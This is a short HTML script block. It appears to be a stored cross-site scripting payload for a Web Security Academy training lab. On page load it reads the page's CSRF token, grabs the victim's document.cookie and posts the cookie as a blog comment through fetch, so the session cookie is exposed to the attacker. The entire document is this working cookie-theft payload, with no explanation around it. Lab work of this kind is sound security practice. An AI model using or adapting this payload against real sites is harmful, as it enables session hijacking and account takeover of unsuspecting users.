<script>
    window.onload = function () {
        var csrfToken = document.getElementsByTagName("input")[0].getAttribute("value");
        var data = "csrf=" + csrfToken + "&postId=5&comment=" + document.cookie + "&name=hacker&email=test@test.com&website=";

        fetch('https://lab-id.web-security-academy.net/post/comment', {
            method: 'POST',
            mode: 'no-cors',
            body: data,
        })
        .then(function(response) {
            // Check if the response status is within the 2xx range
            if (response.ok) {
                alert(response.text()); // or response.json() if expecting JSON
            } else {
                throw new Error('Network response was not ok: ' + response.statusText);
            }
        })
        .then(function(data) {
            alert('Success:', data);
            // Handle success here
        })
        .catch(function(error) {
            alert('Error during fetch operation:', error);
            // Handle error here
        });
    };
</script>
